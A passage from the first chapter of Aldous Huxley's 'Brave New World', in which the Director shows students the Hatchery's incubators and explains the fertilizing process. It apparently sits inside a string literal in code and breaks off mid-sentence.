	Tall and rather thin but upright, the Director advanced into the room. He had a long chin and big, rather prominent teeth, just covered, when he was not talking, by his full, floridly curved lips. Old, young? Thirty? fifty? fifty-five? It was hard to say. And anyhow the question didn’t arise; in this year of stability, a.f. 632, it didn’t occur to you to ask it.

	‘I shall begin at the beginning,’ said the D.H.C. and the more zealous students recorded his intention in their note-books: Begin at the beginning. ‘These,’ he waved his hand, ‘are the incubators.’ And opening an insulated door he showed them racks upon racks of numbered test-tubes. ‘The week’s supply of ova. Kept,’ he explained, ‘at blood heat; whereas the male gametes,’ and here he opened another door, ‘they have to be kept at thirty-five instead of thirty-seven. Full blood heat sterilizes.’ Rams wrapped in thermogene beget no lambs.

	Still leaning against the incubators he gave them, while the pencils scurried illegibly across the pages, a brief description of the modern fertilizing process; spoke first, of course, of its surgical introduction—‘the operation undergone voluntarily for the good of Society, not to mention the fact that it carries a bonus amounting to six months’ salary’; continued with some account of the technique for preserving the excised ovary alive and actively developing; passed on to a consideration of optimum temperature, salinity, viscosity; referred to the liquor in which the detached and ripened eggs were kept; and, leading his charges to the work tables, actually showed them how this liquor was drawn off from the test-tubes; how it was let out drop by drop on to the specially warmed slides of the microscopes; how the eggs which it contained were inspected for abnormalities, counted and transferred to a porous receptacle; how (and he now took them'
);